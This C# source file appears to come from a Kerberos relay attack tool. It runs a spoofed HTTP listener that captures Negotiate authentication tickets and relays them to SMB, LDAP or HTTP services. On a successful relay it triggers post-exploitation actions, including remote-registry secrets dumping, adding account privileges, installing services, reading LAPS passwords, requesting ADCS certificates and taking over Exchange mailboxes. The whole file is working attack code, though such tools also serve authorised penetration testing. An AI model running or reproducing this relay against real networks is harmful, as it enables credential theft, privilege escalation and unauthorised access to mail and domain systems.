﻿using System;
using System.IO;
using System.Text;
using System.Net;
using System.Threading.Tasks;
using System.Net.Http;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Net.Sockets;
using System.Text.RegularExpressions;

namespace KrbRelay.Spoofing
{
    public interface IHttpServer
    {
        void Start();
    }
    public class HttpServer : IHttpServer
    {
        private readonly TcpListener listener;
        private readonly string service;

        public HttpServer(string ip, int port, string service)
        {
            this.listener = new TcpListener(IPAddress.Parse(ip), port);
            this.service = service;
        }

        public void Start()
        {
            this.listener.Start();
            while (true)
            {
                var client = this.listener.AcceptTcpClient();
                var buffer = new byte[10240];
                var stream = client.GetStream();
                var length = stream.Read(buffer, 0, buffer.Length);
                var result = "Access denied";
                var incomingMessage = Encoding.UTF8.GetString(buffer, 0, length);
                Console.WriteLine("Incoming message: {0}", incomingMessage);
                var myMatch = Regex.Matches(incomingMessage, "Authorization: Negotiate .*");

                //relay 
                string ticket = "";
                string targetResp = "";
                if (myMatch.Count > 0)
                {
                    ticket = myMatch[0].Value.Replace("Authorization: ","");
                    //Console.WriteLine(ticket);
                }
                Console.WriteLine();
                
                if (service == "http")
                    targetResp = HttpRelayServer.httpConnect(ticket);
                else if (!string.IsNullOrEmpty(ticket))
                {
                    if (service == "cifs")
                        targetResp = HttpRelayServer.smbConnect(ticket);
                    else if (service == "ldap")
                        targetResp = HttpRelayServer.ldapConnect(ticket);
                }
                else
                {
                    targetResp = "Negotiate";
                    //targetResp = "Kerberos";
                }

                //string status = "HTTP/1.0 200 OK";
                string status = "HTTP/1.1 401 Unauthorized";
                byte[] msg = Encoding.UTF8.GetBytes(
                        status + Environment.NewLine
                        + "Content-Length: " + result.Length + Environment.NewLine
                        + "Content-Type: " + "text/html" + Environment.NewLine
                        + "WWW-Authenticate: " + targetResp + Environment.NewLine
                        + Environment.NewLine
                        + result
                        + Environment.NewLine + Environment.NewLine);
                stream.Write(msg, 0, msg.Length);
                    
            }
        }
    }

    internal class HttpRelayServer
    {
        public static void start(string Service, string argSpooferIP)
        {
            Console.WriteLine("[*] Listening for connections on http://{0}:80", argSpooferIP);
            IHttpServer server = new HttpServer(argSpooferIP, 80, Service);
            server.Start();
        }

        //clients
        public static string ldapConnect(string ticket)
        {
            Console.WriteLine("ldapclient");

            byte[] apReq = Convert.FromBase64String(ticket.Replace("Negotiate ", ""));
            var buffer = new SecurityBuffer(apReq);

            var berval = new berval
            {
                bv_len = buffer.Count,
                bv_val = buffer.Token
            };
            var bervalPtr = Marshal.AllocHGlobal(Marshal.SizeOf(berval));
            Marshal.StructureToPtr(berval, bervalPtr, false);

            var bind = Interop.ldap_sasl_bind(
                State.ld,
                "",
                "GSS-SPNEGO", // GSS-SPNEGO / GSSAPI
                bervalPtr,
                IntPtr.Zero,
                IntPtr.Zero,
                out IntPtr servresp);
            Console.WriteLine("[*] ldap_sasl_bind: {0}", (LdapStatus)bind);

            Interop.ldap_get_option(State.ld, 0x0031, out int value);
            LdapStatus status = (LdapStatus)value;

            Console.WriteLine("[*] ldap_get_option: {0}", status);

            if (status == LdapStatus.Success)
            {
                Console.WriteLine("[+] LDAP session established");
                Clients.Attacks.Ldap.LAPS.read(State.ld, "");
            }

            //return string.Format("Negotiate {0}", Convert.ToBase64String(resp));

            return "";
        }
        public static string smbConnect(string ticket)
        {
            byte[] apReq = Convert.FromBase64String(ticket.Replace("Negotiate ", ""));
            byte[] resp = Program.smbClient.Login(apReq, out bool success);
            if (success)
            {
                Console.WriteLine("[+] SMB session established");
                //State.stopSpoofing = true;

                try
                {
                    if (State.attacks.Keys.Contains("console"))
                    {
                        Clients.Attacks.Smb.Shares.smbConsole(Program.smbClient);
                    }
                    if (State.attacks.Keys.Contains("list"))
                    {
                        Clients.Attacks.Smb.Shares.listShares(Program.smbClient);
                    }
                    if (State.attacks.Keys.Contains("add-privileges"))
                    {
                        Clients.Attacks.Smb.LSA.AddAccountRights(Program.smbClient, State.attacks["add-privileges"]);
                    }
                    if (State.attacks.Keys.Contains("secrets"))
                    {
                        Clients.Attacks.Smb.RemoteRegistry.secretsDump(Program.smbClient, false);
                    }
                    if (State.attacks.Keys.Contains("service-add"))
                    {
                        string arg1 = State.attacks["service-add"].Split(new[] { ' ' }, 2)[0];
                        string arg2 = State.attacks["service-add"].Split(new[] { ' ' }, 2)[1];
                        Clients.Attacks.Smb.ServiceManager.serviceInstall(Program.smbClient, arg1, arg2);
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine("[-] {0}", e);
                }
            }

            return string.Format("Negotiate {0}", Convert.ToBase64String(resp));
        }
        public static string httpConnect(string ticket)
        {
            string endpoint = "/";
            if (!string.IsNullOrEmpty(State.attacks["endpoint"]))
            {
                endpoint = State.attacks["endpoint"].TrimStart('/');
            }

            HttpResponseMessage result;
            using (var message = new HttpRequestMessage(HttpMethod.Get, endpoint))
            {
                if (!string.IsNullOrEmpty(ticket))
                    message.Headers.Add("Authorization", ticket);

                message.Headers.Add("Connection", "keep-alive");
                message.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko");
                result = Program.httpClient.SendAsync(message).Result;
            }

            if (result.StatusCode != HttpStatusCode.Unauthorized)
            {
                Console.WriteLine("[+] HTTP session established");
                //Program.stopSpoofing = true;

                //Kerberos auth may not require set-cookies
                IEnumerable<string> cookies = null;
                foreach (var h in result.Headers)
                {
                    if (h.Key == "Set-Cookie")
                    {
                        cookies = h.Value;
                        Console.WriteLine("[*] Authentication Cookie;\n" + string.Join(";", h.Value));
                    }
                }

                try
                {
                    if (State.attacks.Keys.Contains("proxy"))
                    {
                        Clients.Attacks.Http.ProxyServer.Start(Program.httpClient, Program.httpClient.BaseAddress.ToString());
                    }

                    if (State.attacks.Keys.Contains("adcs"))
                    {
                        Clients.Attacks.Http.ADCS.requestCertificate(Program.httpClient, State.relayedUser, State.relayedUserDomain, State.attacks["adcs"]);
                    }

                    if (State.attacks.Keys.Contains("ews-delegate"))
                    {
                        Clients.Attacks.Http.EWS.delegateMailbox(Program.httpClient, State.relayedUser, State.attacks["ews-delegate"]);
                    }

                    if (State.attacks.Keys.Contains("ews-search"))
                    {
                        Clients.Attacks.Http.EWS.readMailbox(Program.httpClient, "inbox", State.attacks["ews-search"]);
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine("[-] {0}", e);
                }
            }
            else
            {
                foreach (var header in result.Headers)
                {
                    if (header.Key == "WWW-Authenticate")
                    {
                        Console.WriteLine("[*] WWW-Authenticate: {0}", header.Value.First());
                        return header.Value.First();
                    }
                }
            }
            return "";
        }
    }
}
